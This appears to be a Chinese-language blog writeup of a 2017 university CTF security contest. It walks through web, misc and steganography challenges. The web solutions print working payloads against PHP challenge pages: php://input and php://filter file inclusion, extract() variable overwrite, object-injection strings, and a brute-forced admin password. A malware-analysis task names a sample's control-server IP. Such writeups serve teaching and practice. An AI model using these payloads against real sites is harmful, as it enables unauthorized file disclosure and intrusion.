---
title: 2017-miac2-writeup
comments: true
date: 2017-10-31 15:16:41
tags:
	- writeup
categories:
	- 信息安全
	- writeup
keywords: 
	- writeup
---
2017全国高校移动互联网应用开发创新大赛-安全赛-第二场-部分writeup。

大部分题目都是满基础的，我等渣渣也做的蛮舒服的。据说决赛会有80支队伍。
第一次看这么多人的决赛，期待决赛场上有意思的事情发生。


<!-- more -->
## WEB
### web1-签到题（40pt）
审查元素，发现有maxlenth属性，修改其值，然后post一个长数据，即可得到flag。


### web2-简单的题（80pt）
审查元素，发现有网页源代码。 
然后直接将password以数组形式post过去。
> postdata:`username=admin&password[]=admin`

### web3-web100-2（100pt）
?hint即可读到源码。
然后设置Cookie为serialize($KEY)
```
<?php
$KEY='BDCTF:www.bluedon.com'; 
echo serialize($KEY)
```
flag:flag{pBXeeZdOkG1QTP1}

### web4-送大礼（100pt）
点击链接，发现一串代码（jsfuck编码），然后console运行。
得到源码：
```
<?php
extract($_GET);  
if(isset($bdctf))  {      
$content=trim(file_get_contents($flag));
if($bdctf==$content){
        echo'bdctf{**********}';
}   
else    
{
        echo'这不是蓝盾的密码啊';    
}
```
payload: 
> getdata: ` ?bdctf=c%3D1&flag=php://input`
> postdata:` c=1`

### web5-蓝盾管理员（100pt）：
2014年的一道原题，利用php特性
payload：
> getdata：`?user=php://input&file=php://filter/convert.base64-encode/resource=flag.php`
> postdata：`the user is bdadmin`

bdctf{Lfi_AnD_More}

### web6-火星撞地球1（200pt）：
admin登录提示密码错误，a登录提示用户不存在。
经过爆破，得到admin的密码为1q2w3e4r
提交flag{1q2w3e4r}成功提交。

### web7-chatbot（200pt）**待补充**
发现接口
http://8eaaa8aed3818244e4f9f31669aac9e8.yogeit.com:8080/admin.php
传入notes后会返回 notes+账号名称+notes。
而且账号名称会变化，你所注册的账号轮播（Cookie的Session没有变），疑似条件竞争。
注册时，密钥加密方式为md5(md5(md5($pass)))
注册时，可以在用户名处进行注入。可判断出后台为django。

### web8-密室杀人案（150pt）

存在David.php
发现：O:4:"Ford":1:{s:6:"Walker";s:8:"flag.php";}
然后将以上数据get形式传给侦探we....即可
payload：
> getdata：`David.php?we...=O:4:"Ford":1:{s:6:"Walker";s:8:"flag.php";`

*备注：忘了侦探叫什么名字了。*

### web9-bluedon用户（200pt）

与5题相似payload，获取到class.php源码
```
<?php
class Read{//f1a9.php
    public $file;
    public function __toString(){
        if(isset($this->file)){
            echo file_get_contents($this->file);    
        }
        return "恭喜get flag";
    }
}
?>
```
类似第5题。只不过后边用了一个unserialize。
上次某某比赛的原题。
最后的payload：
 > getdata:`?user=php://input&file=class.php&pass=O:4:"Read":1:{s:4:"file";s:8:"f1a9.php";}`
 > postdata:`the user is bluedon`

## MISC

### misc1-杂项全家桶（100pt）
拿到bdctf1.png，改后缀zip，解压的music.mp3文件
ihdr文件头。尝试修复png文件。得到二维码，反色后扫描，得到“工井大人夫王”
当铺解密得到 485376
再使用 MP3stego 进行解密，得到 fx4qx0hj_4_cg{Wvf}，再进行栅栏，凯撒转化，得flag
bdctf{4_Sm4rt_b0y}

参考资料：http://blog.csdn.net/etf6996/article/details/70146940

### misc2-抓小鸡（150pt）
下载后，发现是一个chm文档，尝试在主机打开。被win defender拦截。
尝试用好压打开。发现readme.html，打开后立即被拦截，于是拖到虚拟机打开。
题目要求，小鸡的地址即为flag。

![](https://img.5am3.com/5am3/img/20191214145904.png)

所以flag{23.83.243.205}


## stega
### stega1-像素隐藏（70pt）
伪加密压缩包，得到png文件，修改png文件高度即可得flag
Bdctf{u32wg8doib1}



